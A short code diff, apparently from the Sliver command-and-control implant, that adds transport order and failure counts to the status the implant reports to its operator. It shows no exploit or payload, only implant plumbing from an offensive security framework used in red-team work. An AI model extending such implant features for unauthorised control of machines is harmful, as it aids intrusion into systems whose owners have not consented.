@@ -80,11 +80,13 @@ func c2Handler(envelope *sliverpb.Envelope, resp handlers.RPCResponse) {
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.Transports{Response: &commonpb.Response{}}
 
-	for _, tp := range Transports.Available {
+	for order, tp := range Transports.Available {
 		transport := &sliverpb.Transport{
 			ID:       tp.Profile.ID,
+			Order:    int32(order),
 			Running:  tp.Profile.Active,
 			Attempts: int32(tp.attempts),
+			Failures: int32(tp.failures),
 			Profile:  tp.Profile,
 		}
 		res.Transports = append(res.Transports, transport)
